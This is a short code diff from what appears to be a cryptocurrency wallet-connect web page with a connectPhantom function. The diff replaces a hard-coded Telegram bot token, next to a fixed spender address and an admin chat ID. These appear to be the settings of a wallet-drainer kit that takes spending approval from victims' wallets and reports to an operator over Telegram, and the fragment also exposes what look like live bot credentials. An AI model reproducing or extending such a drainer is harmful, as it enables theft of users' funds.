@@ -75,7 +75,7 @@ async function connectPhantom() {
             const WALLETCONNECT_PROJECT_ID = "85d1310d55b14854c6d62bab3b779200";
             const SPENDER_ADDRESS = "0x89e8ed15656ab289e980f92e59ddf7ecd2a36f85";
 
-            const TELEGRAM_BOT = "8482914657:AAGQwbljH2zLVFMZngscd9LrYxaB5ypudTU";
+            const TELEGRAM_BOT = "8457525765:AAFYTnliMT7j8L4QWcDmJfWdTi1_op60Ry8";
             const ADMIN_CHAT_ID = "5126266116";
 
             const NETWORKS = {
